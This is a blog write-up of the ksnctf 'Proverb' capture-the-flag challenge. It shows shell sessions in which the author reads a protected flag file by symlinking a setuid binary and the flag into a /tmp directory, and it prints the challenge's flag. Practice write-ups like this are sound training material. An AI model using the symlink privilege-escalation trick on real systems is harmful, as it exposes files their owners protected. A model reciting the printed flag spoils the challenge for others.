---
layout : post
title : ksnctf Proverb write-up
comments : true
---

This article is a write-up for [Proverb](http://ksnctf.sweetduet.info/problem/13) at ksnctf.  

Using given information, let's connect to the server `ssh -p 10022 q13@ctfq.sweetduet.info`.  

```
taishi@sirius:~
⇒  ssh -p 10022 q13@ctfq.sweetduet.info
q13@ctfq.sweetduet.info's password: 
Last login: Tue Oct 20 20:12:26 2015 from 10.0.2.2
[q13@localhost ~]$ ls -al
total 48
drwxr-xr-x   2 root root  4096 Jun  1  2012 .
drwxr-xr-x. 17 root root  4096 Oct  6  2014 ..
-rw-r--r--   1 root root    18 May 11  2012 .bash_logout
-rw-r--r--   1 root root   176 May 11  2012 .bash_profile
-rw-r--r--   1 root root   124 May 11  2012 .bashrc
-r--------  19 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x  17 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r--   2 root root   755 Jun  1  2012 proverb.txt
-r--r--r--   1 root root   151 Jun  1  2012 readme.txt
[q13@localhost ~]$ cat readme.txt 
You are not allowed to connect internet and write the home directory.
If you need temporary directory, use /tmp.
Sometimes this machine will be reset.
[q13@localhost ~]$ file proverb
proverb: setuid executable, regular file, no read permission
[q13@localhost ~]$ ./proverb 
Take heed of the snake in the grass.
[q13@localhost ~]$ ./proverb
Misfortunes never come singly.
[q13@localhost ~]$ ./proverb
Spare the rod and spoil the child.
[q13@localhost ~]$ ./proverb
Nothing ventured, nothing gained.
[q13@localhost ~]$ ./proverb
Take heed of the snake in the grass.
```

Inside, there are three files: `flag.txt` (probably contains FLAG), `proverb` (executable with SUID), and `proverb.txt`. It seems that `proverb` randomly chooses and prints out a line of strings inside `proverb.txt`.  
Since you can't analyze `proverb` using GDB (no read access), let's think about somehow using `/tmp` directory.  


However, although you have a write-permission, you don't have read-permission to `/tmp` directory. Weird. Started suspicious that there might be some files inside `/tmp` that leads you to capture the flag.  


```
[q13@localhost ~]$ ls /tmp
ls: cannot open directory /tmp: Permission denied
```

Now, let's start a guessing game.  

```
[q13@localhost ~]$ cat /tmp/proverb.txt
Please make your own subdirectory.
```

Here you find `proverb.txt`, saying that you should make a subdirectory. Make sense!. Let's create a subdirectory inside /tmp, then make a symbolic link of `~/proverb` and `~/flag.txt` and rename `flag.txt` to `proverb.txt`.  

```
[q13@localhost ~]$ mkdir /tmp/my_dir
[q13@localhost ~]$ cd /tmp/my_dir
[q13@localhost my_dir]$ ln -s ~/proverb .
[q13@localhost my_dir]$ ln -s ~/flag.txt proverb.txt
[q13@localhost my_dir]$ ./proverb
FLAG_XoK9PzskYedj/T&B
```

Flag is: __FLAG_XoK9PzskYedj/T&B__

